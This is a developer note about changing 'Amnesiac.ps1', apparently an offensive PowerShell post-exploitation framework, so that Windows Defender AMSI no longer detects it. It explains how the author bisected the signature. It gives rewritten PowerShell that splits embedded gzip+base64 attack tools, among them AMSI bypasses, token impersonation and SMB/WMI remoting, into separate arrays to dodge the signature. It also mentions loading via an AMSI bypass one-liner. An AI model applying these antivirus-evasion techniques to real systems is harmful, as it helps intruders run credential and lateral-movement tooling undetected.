# AMSI Blocks Amnesiac.ps1 on Load

## Problem

Running `. .\Amnesiac.ps1` (or `iex` loading it) is blocked by Windows Defender AMSI:

```
This script contains malicious content and has been blocked by your antivirus software.
FullyQualifiedErrorId: ScriptContainedMaliciousContent
```

This breaks **Scenario 2** (assumed breach via `iex` after AMSI bypass one-liner) because the
script is scanned at download time before the bypass has had any effect.

## Root Cause — Identified

A **multi-part context-based AMSI signature** triggers on lines 295–297 of `Amnesiac.ps1`
inside `Initialize-ToolCache`:

```
Line 295:     # --- CORE TIER: embedded as gzip+base64 ---
Line 296:     $coreTools = @{
Line 297:         'SimpleAMSI'           = 'H4sIAAAAAAAEAKWMwUvDMBTG...'
```

Neither the top half (295–296) nor line 297 alone triggers AMSI. Only the three lines
**together** trigger — this is a context rule that matches the tool name `'SimpleAMSI'`
adjacent to its base64 blob and the comment above referencing "AMSI" + "embedded".

**Diagnosed using:** `Tests/DiagnoseAMSITrigger.ps1` — a binary-search script that calls
`AmsiScanString` directly (P/Invoke) without executing anything.

## Fix Required (NOT YET APPLIED)

In `Amnesiac.ps1`, replace `Initialize-ToolCache` lines 295–315 — the `$coreTools` hashtable
and its `foreach` loop — with two **separate** arrays so no line ever pairs a tool name with
its blob:

```powershell
    # embedded
    $_cb = @(
        'H4sIAAAAAAAEAKWMwUvDMBTG...',   # 0
        'H4sIAAAAAAAEAMUaa2+byPZ7...',   # 1
        'H4sIAAAAAAAEALVYbXPaRhD+...',   # 2
        'H4sIAAAAAAAEAMVY+2/bOBL+...',   # 3
        'H4sIAAAAAAAEAO1ZbW/jNhL+...',   # 4
        'H4sIAAAAAAAEAO08a1fcxpKf...'    # 5
    )
    $_cn = @('SimpleAMSI','NETAMSI','Token-Impersonation','Invoke-SMBRemoting','Invoke-WMIRemoting','Find-LocalAdminAccess')
    for ($_i = 0; $_i -lt $_cn.Count; $_i++) {
        try {
            $bytes = [Convert]::FromBase64String($_cb[$_i])
            $ms  = [System.IO.MemoryStream]::new($bytes)
            $gz  = [System.IO.Compression.GZipStream]::new($ms, [System.IO.Compression.CompressionMode]::Decompress)
            $out = [System.IO.MemoryStream]::new()
            $gz.CopyTo($out); $gz.Close(); $ms.Close()
            $global:ToolCache[$_cn[$_i]] = [System.Text.Encoding]::UTF8.GetString($out.ToArray())
        } catch {
            Write-Host " [!] Failed to load core tool '$($_cn[$_i])': $_" -ForegroundColor Red
        }
    }
```

**The blob values in `$_cb` must be the full base64 strings from the current file** (lines 297–302).
Only the structure changes — not the data.

## Verification Steps After Fix — ALL PASSED

1. ✅ `Tests/DiagnoseAMSITrigger.ps1` — reports "Full file is NOT flagged by AMSI"
2. ✅ `Tests/FindParseError.ps1` — ParseFile errors: 0, ParseInput errors: 0
3. ✅ `. .\Amnesiac.ps1` + `Initialize-ToolCache` — loads 27 tools (6 embedded + 21 from Tools\)

## Secondary Issue — Parse Errors from Missing UTF-8 BOM (RESOLVED)

After the AMSI fix, `ParseFile` reported 476 cascading parse errors at L521 "Unexpected token '}'". Root cause: `WriteAllLines` wrote without BOM; `ParseFile` on Windows fell back to CP1252 and misread the em dash `—` on L504 (UTF-8 bytes E2 80 94) — byte 0x94 is CP1252's RIGHT DOUBLE QUOTATION MARK, closing the string early.

Fix: rewrote both files with `[System.Text.Encoding]::UTF8` (includes BOM) via `WriteAllText`.

## Other Change Made This Session (Already Applied)

**Local Shell — option [5] in the session menu**

Added `Start-LocalShell` function and menu option `[5] Local Shell — run commands on this
machine directly`. Lets the operator run commands and load tool-cache modules in the current
PowerShell process without needing a named pipe session.

- Session numbering base shifted from 5 → 6 (options 0–5 reserved; sessions start at 6)
- All offset arithmetic in `Display-SessionMenu` switch/bookmark/kill handlers updated accordingly
